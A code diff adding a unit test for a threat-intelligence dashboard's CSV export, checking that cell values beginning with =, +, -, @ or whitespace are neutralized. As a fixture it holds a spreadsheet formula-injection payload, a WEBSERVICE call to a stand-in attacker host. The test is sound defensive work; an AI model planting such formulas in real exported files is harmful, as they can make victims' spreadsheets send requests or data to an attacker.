@@ -75,6 +75,24 @@ test('all desk counters count only available feed items and sources, not hypothe
   assert.equal(desk.LIMIT, 12);
 });
 
+test('filtered public CTI CSV neutralizes spreadsheet formulas and quotes correctly', () => {
+  const malicious = "=WEBSERVICE(\"https://attacker.invalid/\")";
+  const cell = desk.csvCell(malicious);
+  assert.ok(cell.startsWith('"\'='));
+  assert.ok(cell.includes('""https://attacker.invalid/""'));
+  for (const value of ['+1+2','-1+2','@sum(A1)','  =2+3','\t=2+3']) {
+    assert.ok(desk.csvCell(value).startsWith('"\''),
+      'Spreadsheet formula not neutralized: ' + value);
+  }
+  const rows = desk.buildCsv([{id:'CVE-2026-0001',title:malicious,
+    severity:'HIGH',source:'CISA',exploited:true,date:'2026-10-23',
+    href:'/posts/a.html'}]);
+  assert.match(rows, /"Exploitation flagged"/);
+  assert.match(rows, /"Yes \(feed-reported\)"/);
+  assert.match(rows, /"https:\/\/soc\.cyberdudebivash\.in\/posts\/a\.html"/);
+  assert.ok(rows.endsWith('\r\n'));
+});
+
 test('stale or missing public feed cannot be displayed as healthy runtime', () => {
   const stale = runtime.classifyFeed({ ok: true, feed: {
     generatedAt: '2026-01-01T00:00:00.000Z'
